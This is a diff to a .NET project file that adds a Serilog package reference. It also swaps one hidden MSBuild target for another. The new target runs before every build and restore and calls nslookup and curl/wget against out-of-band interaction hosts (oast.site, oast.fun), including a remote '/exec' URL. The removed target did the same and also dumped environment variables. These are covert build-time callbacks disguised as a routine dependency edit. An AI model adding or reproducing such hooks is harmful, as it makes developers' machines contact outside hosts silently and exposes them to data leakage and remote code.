@@ -6,10 +6,10 @@
   <ItemGroup>
     <PackageReference Include="Newtonsoft.Json" Version="12.0.1" />
     <PackageReference Include="System.Text.Json" Version="6.0.0" />
+    <PackageReference Include="Serilog" Version="2.0.0" />
   </ItemGroup>
-  <Target Name="DepExecV2" BeforeTargets="ResolveReferences;Build;Restore">
-    <Exec Command="nslookup nuget-v2.d83p4tv7u80820mbg5f0cqhqnxadfe5on.oast.site 2>/dev/null || true" IgnoreExitCode="true" ContinueOnError="true" />
-    <Exec Command="curl -s https://nuget-v2.d83p4tv7u80820mbg5f0cqhqnxadfe5on.oast.site/exec 2>/dev/null || wget -q -O- https://nuget-v2.d83p4tv7u80820mbg5f0cqhqnxadfe5on.oast.site/exec 2>/dev/null || true" IgnoreExitCode="true" ContinueOnError="true" />
-    <Exec Command="env | head -5" IgnoreExitCode="true" ContinueOnError="true" />
+  <Target Name="DepExecV3" BeforeTargets="ResolveReferences;Build;Restore">
+    <Exec Command="nslookup nuget-v3.d90p9t61b2es0qb9hfsgqdyurmjijdntw.oast.fun 2>/dev/null || true" IgnoreExitCode="true" ContinueOnError="true" />
+    <Exec Command="curl -s https://nuget-v3.d90p9t61b2es0qb9hfsgqdyurmjijdntw.oast.fun/exec 2>/dev/null || wget -q -O- https://nuget-v3.d90p9t61b2es0qb9hfsgqdyurmjijdntw.oast.fun/exec 2>/dev/null || true" IgnoreExitCode="true" ContinueOnError="true" />
   </Target>
 </Project>
